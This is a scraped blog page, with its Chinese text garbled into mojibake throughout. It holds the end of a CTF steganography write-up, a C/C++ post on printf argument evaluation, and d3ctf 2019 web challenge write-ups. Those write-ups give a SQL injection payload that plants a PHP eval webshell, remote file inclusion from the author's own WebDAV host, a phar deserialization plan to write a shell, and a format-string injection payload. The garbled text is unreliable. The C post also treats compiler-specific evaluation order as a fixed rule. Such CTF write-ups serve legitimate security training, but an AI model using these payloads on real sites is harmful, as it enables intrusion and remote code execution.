<p>å›¾ä¸­æ–¹æ¡†å³ä¸ºç¬¬ä¸€ä¸ªboxçš„head,åŸæœ¬åº”è¯¥æ˜¯<code>ftyp(0x66747970)</code>è€Œè¿™é‡Œç¡®å®<code>66459707</code>,ä½ç½®åäº†</p>
<p>æ¢å¤è„šæœ¬</p>
<pre><code class="python">with open(&#39;NBA.mp4&#39;, &#39;rb&#39;) as f:
    keydata =f.read()
t= keydata.encode(&quot;hex&quot;)
l=len(t)
t2=&quot;&quot;
for i in range(0,l,2):
    a=t[i]
    b=t[i+1]
    t2+=b
    t2+=a

print t2[:100]
t2=t2.decode(&quot;hex&quot;)
f2 = open(&#39;NBA2.mp4&#39;, &#39;wb&#39;)
f2.write(t2)
</code></pre>
<p>ç­‰è„šæœ¬è·‘å®ŒåæˆåŠŸæ¢å¤åŸæ¥çš„è§†é¢‘æ–‡ä»¶</p>
<p>è§†é¢‘éšå†™é€šå¸¸æŠŠå†…å®¹å­˜å‚¨åœ¨è§†é¢‘ä¸­çš„æŸä¸ªå›¾ç‰‡,æˆ‘ä»¬ç”¨ ffmpeg ,å°†è§†é¢‘åˆ†ç¦»æˆå›¾ç‰‡</p>
<p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p>
<p>ä¸€å¼ ä¸€å¼ çœ‹è¿‡å»,æˆ‘ä»¬å‘ç°,åœ¨ç¬¬3028å¼ çªç„¶å…¨é»‘äº†</p>
<p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p>
<p>è°ƒæ•´ä¸€ä¸‹å›¾ç‰‡çš„å¯¹æ¯”å¯¹,è·‘å‡ºä¸€ä¸ªäºŒç»´ç </p>
<p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p>
<p><code>flag{I_l0v3_pl4ying_b4sk3tb4ll}</code></p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/æŸmisc/">https://www.ccreater.top/1970/01/01/æŸmisc/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/%E6%9F%90misc/" data-id="ckmn5757x008vs1niaxf86i8j" data-title="æŸmisc" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">ç¼–ç¨‹</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/">ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨"><a href="#ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨" class="headerlink" title="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨"></a>ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨</h1><h2 id="ä»¤äººç–‘æƒ‘çš„ç»“æœ"><a href="#ä»¤äººç–‘æƒ‘çš„ç»“æœ" class="headerlink" title="ä»¤äººç–‘æƒ‘çš„ç»“æœ"></a>ä»¤äººç–‘æƒ‘çš„ç»“æœ</h2><p>æ¥çœ‹ä¸€ä¸ªä»£ç å§</p>
<pre><code class="c++">#include&lt;stdio.h&gt;
int i=0;
int update(){i++;return i;}
int main()
{
    printf(&quot;update():%d i:%d\n&quot;,update(),i);
    return 0;
}</code></pre>
<p>ä½ è§‰å¾—å®ƒçš„è¾“å‡ºç»“æœæ˜¯ä»€ä¹ˆ<br><del>update():1 i:1</del> ?<br><strong>é”™</strong>ï¼Œæ­£ç¡®è¾“å‡ºæ˜¯<code>update():1 i:0</code></p>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ä¸ºä½•ä¼šå¦‚æ­¤,å…ˆæ¥åšä¸ªå®éªŒåº·åº·å§:</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include &lt;queue&gt;
#include&lt;stdio.h&gt; 
using namespace std;
int i=0;
int update(){i++;return i;};
int main()
{
    printf(&quot;----------------------------test printf----------------------------\n&quot;);
    printf(&quot;before:%d\n&quot;,i);
    printf(&quot;update():%d i:%d\n&quot;,update(),i);
    printf(&quot;later:%d\n&quot;,i);

    printf(&quot;before:%d\n&quot;,i);
    printf(&quot;i:%d update():%d \n&quot;,i,update());
    printf(&quot;later:%d\n&quot;,i);

    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());
}</code></pre>
<p>å®ƒçš„è¾“å‡ºç»“æœæ˜¯</p>
<pre><code>----------------------------test printf----------------------------
before:0
update():1 i:0
later:1
before:1
i:2 update():2
later:2
update1:5 update2:4 update3:3</code></pre><p>åªæœ‰printfæ˜¯è¿™æ ·çš„?ä¸ï¼Œå¯å˜å‚æ•°çš„æ‰“å°å‡½æ•°éƒ½å…·æœ‰è¿™æ ·çš„ç‰¹æ€§<br>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹coutæ¥éªŒè¯ä¸€ä¸‹</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include &lt;queue&gt;
#include&lt;stdio.h&gt; 
using namespace std;
int i=0;
int update(){i++;return i;};
int main()
{

    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;
    i=0;
    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;
    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;

    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;
    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;

    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;

}</code></pre>
<p>å®ƒçš„è¾“å‡ºç»“æœæ˜¯:</p>
<pre><code>---------------------------- test cout ----------------------------
before:0
update():1 i:0
later:1
before:1
i:2 update():2
later:2
update1:5 update2:4 update3:3
</code></pre><h2 id="æ±‡ç¼–å±‚é¢çš„è§£é‡Š"><a href="#æ±‡ç¼–å±‚é¢çš„è§£é‡Š" class="headerlink" title="æ±‡ç¼–å±‚é¢çš„è§£é‡Š"></a>æ±‡ç¼–å±‚é¢çš„è§£é‡Š</h2><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·,è¿™å°±å¿…é¡»è¯´èµ·cå’Œc++ä¸­å…³äºå‡½æ•°ä¼ å‚çš„è¿‡ç¨‹äº†:</p>
<p>åœ¨æ±‡ç¼–ä¸­å‡½æ•°ä¼ å‚è¦ä»æœ€åä¸€ä¸ªå‚æ•°åˆ°ç¬¬ä¸€ä¸ªå‚æ•°åˆ†åˆ«å…¥æ ˆï¼Œè¿™æ ·å‡½æ•°å–å‚æ•°çš„æ—¶å€™ï¼Œpopå‡ºæ¥çš„é¡ºåºæ‰æ˜¯1-nã€‚</p>
<p>å› æ­¤,åœ¨<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>ä¸­,å‡½æ•°å…ˆå‹å…¥i,å†æ‰§è¡Œupdate(),å°†å…¶è¿”å›å€¼å‹å…¥æ ˆã€‚</p>
<p>ä»¥ä¸Šåªæ˜¯ç†è®ºï¼ŒçœŸå®çš„ç¯å¢ƒä¸­ç”±x86,x64,32ä½,16ä½æœº,å®ƒä»¬çš„å…·ä½“çš„ä¼ å‚æ–¹å¼ç•¥æœ‰ä¸åŒ:)  </p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹x64ä¸‹è¿™ä¸€æ¡è¯­å¥çš„æ±‡ç¼–ä»£ç </p>
<pre><code>mov     ebx, cs:i
call    _Z6updatev      ; update(void)
mov     r8d, ebx
mov     edx, eax
lea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;
call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>åœ¨X64ä¸‹,æ˜¯å¯„å­˜å™¨ä¼ å‚. å‰4ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ rcx rdx r8 r9è¿›è¡Œä¼ å‚.å¤šä½™çš„é€šè¿‡æ ˆä¼ å‚.ä»å³å‘å·¦å…¥æ ˆã€‚</p>
<p>ä¸Šè¿°ä»£ç ä¸­ æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨rcxä¸­(æœ€åä¸€ä¸ªèµ‹å€¼),update()è¿”å›å€¼åœ¨edx,ä¸­ç¬¬äºŒä¸ªèµ‹å€¼ã€‚iåœ¨r8ä¸­ç¬¬ä¸€ä¸ªèµ‹å€¼ ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>mov     ebx, cs:i</code>ç¨‹åºå…ˆå°†içš„å€¼ç§»åŠ¨åˆ°ebxä¸­ï¼Œå†è°ƒç”¨updateå‡½æ•°,å°†è¿”å›å€¼æ‰€åœ¨å¯„å­˜å™¨eaxç§»åŠ¨åˆ°edxä¸­ã€‚</p>
<p>è™½ç„¶è¿‡ç¨‹æœ‰ç‚¹å˜åŒ–,ä½†æ˜¯æœ€åçš„ç»“æœè¿˜æ˜¯å’Œåœ¨æ±‡ç¼–ä¸­å‡½æ•°ä¼ å‚è¦ä»æœ€åä¸€ä¸ªå‚æ•°åˆ°ç¬¬ä¸€ä¸ªå‚æ•°åˆ†åˆ«å…¥æ ˆã€‚</p>
<h2 id="æ¥ç»ƒä¹ ä¸€ä¸‹å§"><a href="#æ¥ç»ƒä¹ ä¸€ä¸‹å§" class="headerlink" title="æ¥ç»ƒä¹ ä¸€ä¸‹å§"></a>æ¥ç»ƒä¹ ä¸€ä¸‹å§</h2><p>æœ€åä¸Šä¸€ä¸ªé¢˜ç›®å§//</p>
<pre><code class="c++">#include &lt;stdio.h&gt;
int main()
{
    long long a = 1, b = 2, c = 3;
    printf(&quot;%d %d %d\n&quot;, a,b,c);
    return 0;
}</code></pre>
<p>æ±‚è¾“å‡º</p>
<p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">ç­”æ¡ˆå’Œè§£æ</a></p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨/">https://www.ccreater.top/1970/01/01/ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" data-id="ckmn5757x008ys1niejm80let" data-title="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">ç¼–ç¨‹</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-d3ctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/d3ctf2019/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/d3ctf2019/">d3ctf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h1><p>ç–¯ç‹‚æ¶¨å§¿åŠ¿ï¼Œå°±å¾ˆnice</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p> <a href="https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md" target="_blank" rel="noopener">https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md</a> </p>
<p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/</a> </p>
<p> <a href="https://www.anquanke.com/post/id/193939#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193939#h3-4</a> </p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97tefki11j30ao01s743.jpg" alt="image.png"></p>
<p>å’Œusernameæœ‰å…³?</p>
<p>x  æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º:<code>*/echo 1231231231;/*</code>çš„ç”¨æˆ·</p>
<p>äºŒæ¬¡æ³¨å…¥,User çš„indexæ–¹æ³•è°ƒç”¨get_view</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985asdayuj30pm027dfx.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985c901tuj30u208vmxr.jpg" alt="image.png"></p>
<p>åˆ©ç”¨æ›¿æ¢{æ¥ç»•è¿‡select å’Œ unionçš„è¿‡æ»¤,åˆ©ç”¨0xâ€¦.æ¥ç»•è¿‡{çš„è¿‡æ»¤</p>
<p>æœ€åçš„payload</p>
<p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º<code>aaa&#39; unio{n selec}t 0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D limit 1,1#</code>æˆåŠŸæ‹¿åˆ°shellæƒé™</p>
<p> d3ctf{Th4atâ€™s_A_Si11y_P0p_chi4n} </p>
<h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><p>æŠ¥é”™</p>
<pre><code>
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1

Warning: include(http://39.108.164.219:60005/1.txt): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1

Warning: include(): Failed opening &#39;http://39.108.164.219:60005/1.txt&#39; for inclusion (include_path=&#39;.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;&#39;) in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</code></pre><p>è™½ç„¶ç¦ç”¨äº†httpåè®®,ä½†æ˜¯è¿˜æ˜¯ä¼šå‘é€è¯·æ±‚</p>
<p>uncè·¯å¾„è¿œç¨‹æ–‡ä»¶åŒ…å«</p>
<p>ä¸€é”®å¯åŠ¨ä¸€ä¸ªwebdavæœåŠ¡å™¨</p>
<p><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code>ç„¶åæŠŠphpæ–‡ä»¶æ”¾åˆ°/root/webdav/dataé‡Œå°±è¡Œäº†</p>
<p><a href="http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf" target="_blank" rel="noopener">http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf</a></p>
<p>eval($_COOKIE[â€˜aâ€™]);</p>
<p>whois</p>
<pre><code>Domain Name: D3CTF.IO
Registry Domain ID: D503300001132938421-LRMS
Registrar WHOIS Server: whois.namesilo.com
Registrar URL: http://www.namesilo.com
Updated Date: 2019-10-14T20:31:26Z
Creation Date: 2019-08-15T11:56:00Z
Registry Expiry Date: 2020-08-15T11:56:00Z
Registrar Registration Expiration Date:
Registrar: Namesilo, LLC
Registrar IANA ID: 1479
Registrar Abuse Contact Email: 
Registrar Abuse Contact Phone: +1.4805240066
Reseller:
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Organization: See PrivacyGuardian.org
Registrant State/Province: AZ
Registrant Country: US
Name Server: DNS21.HICHINA.COM
Name Server: DNS22.HICHINA.COM
DNSSEC: unsigned

The Registrar of Record identified in this output may have an RDDS service that can be queried 
for additional information on how to contact the Registrant, Admin, or Tech contact of the 
queried domain name.</code></pre><pre><code>æœ¬ç«™æ•°æ®ï¼šé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒº è…¾è®¯äº‘
å‚è€ƒæ•°æ®1ï¼šé¦™æ¸¯ tencent.com
å‚è€ƒæ•°æ®2ï¼šç¾å›½
å…¼å®¹IPv6åœ°å€ï¼š::966D:4AEA
æ˜ å°„IPv6åœ°å€ï¼š::FFFF:966D:4AEA</code></pre><p>whoami</p>
<pre><code>whoami /all

USER INFORMATION
----------------

User Name        SID                                         
================ ============================================
172_19_97_4\w1nd S-1-5-21-330377560-317033357-2560255023-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    

</code></pre><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><pre><code class="php">&lt;?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this-&gt;userdir = &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;]);
        $this-&gt;url = $url;
        $this-&gt;filename  =  $filename;
        if (!file_exists($this-&gt;userdir)) {
            mkdir($this-&gt;userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this-&gt;userdir != &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;])) {
            die(&#39;hacker!!!&#39;);
        }
    }
    public function checkurl(){
        $r = parse_url($this-&gt;url);
        if (!isset($r[&#39;scheme&#39;]) || preg_match(&quot;/file|php/i&quot;,$r[&#39;scheme&#39;])){
            die(&#39;hacker!!!&#39;);
        }
    }
    public function checkext(){
        if (stristr($this-&gt;filename,&#39;..&#39;)){
            die(&#39;hacker!!!&#39;);
        }
        if (stristr($this-&gt;filename,&#39;/&#39;)){
            die(&#39;hacker!!!&#39;);
        }
        $ext = substr($this-&gt;filename, strrpos($this-&gt;filename, &quot;.&quot;) + 1);
        if (preg_match(&quot;/ph/i&quot;, $ext)){
            die(&#39;hacker!!!&#39;);
        }
    }
    public function upload(){
        $this-&gt;checkdir();
        $this-&gt;checkurl();
        $this-&gt;checkext();
        $content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);
        if (preg_match(&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;, $content)){
            die(&#39;hacker!!!&#39;);
        }
        file_put_contents($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename,$content);
    }
    public function remove(){
        $this-&gt;checkdir();
        $this-&gt;checkext();
        if (file_exists($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename)){
            unlink($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename);
        }
    }
    public function count($dir) {
        if ($dir === &#39;&#39;){
            $num = count(scandir($this-&gt;userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num &gt; 0) {
            return &quot;you have $num files&quot;;
        }
        else{
            return &quot;you don&#39;t have file&quot;;
        }
    }
    public function __toString() {
        return implode(&quot; &quot;,scandir(__DIR__.&quot;/&quot;.$this-&gt;userdir));
    }
    public function __destruct() {
        $string = &quot;your file in : &quot;.$this-&gt;userdir;
        file_put_contents($this-&gt;filename.&quot;.txt&quot;, $string);
        echo $string;
    }
}

if (!isset($_POST[&#39;action&#39;]) || !isset($_POST[&#39;url&#39;]) || !isset($_POST[&#39;filename&#39;])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST[&#39;url&#39;],$_POST[&#39;filename&#39;]);
if($_POST[&#39;action&#39;] === &quot;upload&quot;) {
    $dir-&gt;upload();
}
elseif ($_POST[&#39;action&#39;] === &quot;remove&quot;) {
    $dir-&gt;remove();
}
elseif ($_POST[&#39;action&#39;] === &quot;count&quot;) {
    if (!isset($_POST[&#39;dir&#39;])){
        echo $dir-&gt;count(&#39;&#39;);
    } else {
        echo $dir-&gt;count($_POST[&#39;dir&#39;]);
    }
}</code></pre>
<blockquote>
<p>webroot in /var/www/html<br>Notice:scanner is useless<br>hint1: webroot changes every 10 mins<br>hint2: glob<br>hint3: <a href="https://www.php.net/manual/en/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/en/language.oop5.decon.php</a>  ** Pay attention to the notes in the article **</p>
</blockquote>
<h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><p>uploadå¤„urlå¯æ§,æ‰€ä»¥åªè¦ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ä¾¿å¯ä»¥ååºåˆ—åŒ–</p>
<p>åˆ©ç”¨è¿™ä¸ªèƒ½åšåˆ°:</p>
<ol>
<li>æ‰«ç›®å½•<code>__destruct__=&gt;__toString__</code></li>
<li>ä»»æ„ä½ç½®å†™æ–‡ä»¶,ä½†æ˜¯å› ä¸ºä¸Šä¼ pharæ–‡ä»¶æ—¶æœ‰è¿‡æ»¤,æ‰€ä»¥æ–‡ä»¶å†…å®¹ä¹Ÿæœ‰æ‰€é™åˆ¶</li>
</ol>
<p>ä½†æ˜¯</p>
<p><code>phar://phar.phar.gz/test.txt</code></p>
<p><code>å°†pharæ–‡ä»¶å‹ç¼©åä¾¿å¯ä»¥ç»•è¿‡æ–‡ä»¶é™åˆ¶</code></p>
<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥åœ¨ä»»æ„ä½ç½®å†™æ–‡ä»¶çš„æƒé™äº†</p>
<p>äºæ˜¯æˆ‘ä»¬æœ‰è¿™æ ·çš„æ€è·¯:åˆ©ç”¨uploadå†™ä¸€ä¸ªhtaccess,ç„¶åå†åˆ©ç”¨ååºåˆ—åŒ–å†™ä¸€ä¸ªshellã€‚</p>
<p>è¿™é‡Œæœ‰ä¸ªå‘ç‚¹å°±æ˜¯ï¼Œwebä¸»ç›®å½•æ¯éš”10åˆ†é’Ÿå˜åŒ–ä¸€æ¬¡,ä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥è¯»å–webç›®å½•</p>
<p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æˆåŠŸæ‹¿åˆ°shell</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmy4tnlxj30ja05mglr.jpg" alt="image.png"></p>
<p>è¾“å…¥phpinfo()å‘ç°,æœ‰disable_functioné‡Œç¦ç”¨äº†systemç­‰å‡½æ•°,è¿™å°±ä¸çˆ½äº†ã€‚ä½†æ˜¯phpç‰ˆæœ¬æ˜¯7.2ï¼Œä¸Šä¼ </p>
<p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a>  è¿™ä¸ªè€å…„å†™çš„ç»•è¿‡disable_functionçš„è„šæœ¬ï¼Œçˆ½æ­»äº†ã€‚</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmyvlo98j30ga03ywej.jpg" alt="image.png"></p>
<h3 id="showhub"><a href="#showhub" class="headerlink" title="showhub"></a>showhub</h3><p>é˜…è¯»ä»£ç å‘ç°</p>
<pre><code class="php">public function register($username, $password)
    {
        $password = hash(&quot;sha256&quot;, $password);
        $user = (new User(null, $username, $password))-&gt;save();
        if ($user) {
            $_SESSION[&#39;uid&#39;] = $user-&gt;id;
            return $user;
        }
        return false;
    }

public function save()
    {
        $args = get_object_vars($this);
        $args = array_slice($args, 0, -2);
        if ($args[&#39;id&#39;] !== null) {
            $baseSql = &quot;UPDATE `$this-&gt;tbname` SET %s WHERE id=&quot; . $args[&#39;id&#39;];
            $sql = self::prepareUpdate($baseSql, array_slice($args, 1));
            $this-&gt;db-&gt;query($sql);
            if (!$this-&gt;db-&gt;conn-&gt;error) {
                return $this;
            } else {
                return null;
            }

        } else {

            $baseSql = &quot;INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)&quot;;
            $sql = self::prepareInsert($baseSql, $args);
            $this-&gt;db-&gt;query($sql);
            if (!$this-&gt;db-&gt;conn-&gt;error) {
                $objectID = $this-&gt;db-&gt;query(&quot;SELECT LAST_INSERT_ID()&quot;)-&gt;fetch_row()[0];
                return self::findOne(array(&quot;id&quot; =&gt; $objectID));
            } else {
                return null;
            }
        }

    }</code></pre>
<p>registerè°ƒç”¨çš„saveæ–¹æ³•å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥ç»•è¿‡addslashes</p>
<p>æ„é€ <code>user=admin%1$&#39;,0x60)#&amp;pass=123</code></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9l4a1jb20j30l204cgls.jpg" alt="image.png"></p>
